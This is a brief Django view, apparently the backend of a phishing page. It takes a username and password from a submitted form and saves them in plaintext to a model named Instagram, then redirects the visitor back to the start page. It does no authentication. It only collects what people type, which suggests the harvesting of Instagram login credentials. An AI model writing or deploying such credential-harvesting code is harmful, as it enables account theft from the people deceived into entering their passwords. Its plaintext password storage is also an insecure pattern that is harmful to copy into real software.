from django.shortcuts import render,redirect
from .models import Instagram

def home(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        instagram = Instagram.objects.create(username=username, password=password)
        instagram.save()

        return redirect('/')


    return render(request, 'index.html')
